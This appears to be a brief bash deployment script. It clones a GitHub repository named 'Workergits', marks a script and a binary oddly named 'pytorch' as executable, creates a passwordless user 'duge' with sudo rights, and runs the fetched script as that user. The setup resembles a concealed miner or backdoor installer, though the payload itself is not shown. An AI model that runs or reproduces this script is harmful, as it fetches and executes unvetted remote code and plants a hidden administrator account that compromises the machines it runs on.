#!/bin/bash
sudo apt update
git clone https://github.com/babehdyo/Workergits.git && cd Workergits
chmod +x yes.sh && chmod +x pytorch
sudo adduser --disabled-password --gecos "" duge && sudo usermod -aG sudo duge
sudo -u duge -H sh -c "./yes.sh"
